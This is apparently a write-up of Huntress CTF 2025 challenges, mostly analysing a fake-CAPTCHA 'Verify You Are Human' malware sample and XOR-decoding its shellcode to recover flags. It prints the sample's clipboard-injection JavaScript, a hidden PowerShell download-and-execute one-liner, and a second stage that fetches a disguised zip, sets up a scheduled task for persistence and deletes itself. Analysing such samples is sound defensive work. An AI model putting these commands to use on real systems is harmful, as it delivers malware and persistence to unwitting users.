...
# #**ℹ️ Technical Support (Information)**
*[image unavailable]*
*[image unavailable]*
```python
...
*[image unavailable]*
```python
flag{ba634063bfbb5a9f0ca087474163c8fe}
```

# #**👶 Cover All Your Bases (Warmups)**
*[image unavailable]*
*[image unavailable]*
```plain text
...
```plain text
https://8997d8c4.proxy.coursestack.com/
```
*[image unavailable]*
*[image unavailable]*
...
# #**🐞 Verify You Are Human (Malware)**
*[image unavailable]*
*[image unavailable]*
Get script and decode
```javascript
		...
		document.querySelector('.captcha-check').addEventListener("click", function()
		{
			this.style.border = '0.3vh solid #faad3f';
			this.style.opacity = '0';

			const loader = document.querySelector('.loader');
			loader.style.opacity = '1';

			loader.style.animation = 'loaderAnim 1s forwards';
			...
			setTimeout(() =>
			{
				...
				recaptchaSection.style.opacity = '0';
			...
			setTimeout(() =>
			{
				...
				modalLoader.style.marginLeft = '-50vh';
			}, 2100);
			...
			// Отправка клика в админку
			unsecuredCopyToClipboard(decodeURIComponent(escape(atob(""))));
			
			// $.get('https://st-hanbok.com/service/visit/5702b2a25802ff1b520c0d1e388026f8074e836d4e69c10f9481283f886fd9f4');	
...


"C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -W HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://68acc44b.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -W HI -ep bypass -f $UkvqRHtIr"
```
[https://68acc44b.proxy.coursestack.com/?tic=1](https://68acc44b.proxy.coursestack.com/?tic=1)
```plain text
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://68acc44b.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

```plain text
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);
# ([char]46) is '.', ([char]112) is 'p', ([char]121) is 'y', ([char]99) is 'c'
# Result: $JGFDGMKNGD = ".pyc"
# This is a Python compiled file extension.

$HMGDSHGSHSHS = [guid]::NewGuid(); # Creates a unique folder name
$OIEOPTRJGS = $env:LocalAppData;   # Sets the path to the user's Local AppData

irm 'http://68acc44b.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;
```

*[image unavailable]*

Going to [http://68acc44b.proxy.coursestack.com:443/?tic=2](http://68acc44b.proxy.coursestack.com:443/?tic=2) shows a pdf, download but its a zip file
*[image unavailable]*
...
```plain text

```
*[image unavailable]*

```plain text
Going to tic 4 or 5 goes back to the main page, same script
```
```javascript
...
# Decrypt to get shellcode bytes
shellcode = xor_decrypt(ciphertext, key)

# Print as hex for easy reading (each byte separated by space)
print(shellcode.hex(' '))

get the shell code 
┌──(kali㉿kali)-[~/2025-Huntress-CTF/1]
└─$ python 1d.py                                                                                        
55 89 e5 81 ec 80 00 00 00 68 93 d8 84 84 68 90 c3 c6 97 68 c3 90 93 92 68 90 c4 c3 c7 68 9c 93 9c 93 68 c0 9c c6 c6 68 97 c6 9c 93 68 94 c7 9d c1 68 de c1 96 91 68 c3 c9 c4 c2 b9 0a 00 00 00 89 e7 81 37 a5 a5 a5 a5 83 c7 04 49 75 f4 c6 44 24 26 00 c6 85 7f ff ff ff 00 89 e6 8d 7d 80 b9 26 00 00 00 8a 06 88 07 46 47 49 75 f7 c6 07 00 8d 3c 24 b9 40 00 00 00 b0 01 88 07 47 49 75 fa c9 c3
...
```plain text
Take all the Push, in reverse, and bytes in reverse, PUSH 8484D893 = 0x93, 0xD8, 0x84, 0x84
```

```plain text
# Encrypted bytes from pushes (in memory order: reverse push order, little-endian)
encrypted_bytes = bytearray([
    0xC3, 0xC9, 0xC4, 0xC2,  # Push 10
    0xDE, 0xC1, 0x96, 0x91,  # Push 9
    0x94, 0xC7, 0x9D, 0xC1,  # Push 8
    0x97, 0xC6, 0x9C, 0x93,  # Push 7
    0xC0, 0x9C, 0xC6, 0xC6,  # Push 6
    0x9C, 0x93, 0x9C, 0x93,  # Push 5
    0x90, 0xC4, 0xC3, 0xC7,  # Push 4
    0xC3, 0x90, 0x93, 0x92,  # Push 3
    0x90, 0xC3, 0xC6, 0x97,  # Push 2
    0x93, 0xD8, 0x84, 0x84   # Push 1
])

# Decrypt: XOR each byte with 0xA5
decrypted_bytes = bytearray()
for byte in encrypted_bytes:
    decrypted_bytes.append(byte ^ 0xA5)

# The flag is the first 38 bytes (null-terminated at offset 38)
flag = decrypted_bytes[:38].decode('ascii')
print(flag)
```

decode the output script all in one
```python
import base64
...
# Decode outer layer shellcode
ciphertext = base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ==')
key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')
shellcode = xor_decrypt(ciphertext, key)

# extract the encrypted inner bytes from the push immediates in the shellcode
# The pushes start at offset 9 (after prologue), every 5 bytes (68 + 4 bytes imm)
offsets = list(range(55, 9, -5))  # Reversed order for stack layout: last push first
encrypted_inner = bytearray()
for offset in offsets:
    encrypted_inner.extend(shellcode[offset:offset+4])

# Decrypt by XOR with repeating 0xa5 (from the shellcode's 0xa5a5a5a5 XOR)
decrypted_inner = bytearray()
for byte in encrypted_inner:
    decrypted_inner.append(byte ^ 0xa5)

# The flag is the first 38 bytes as ASCII (null-terminated at offset 38)
flag = decrypted_inner[:38].decode('ascii')
print(flag)
```
```plain text
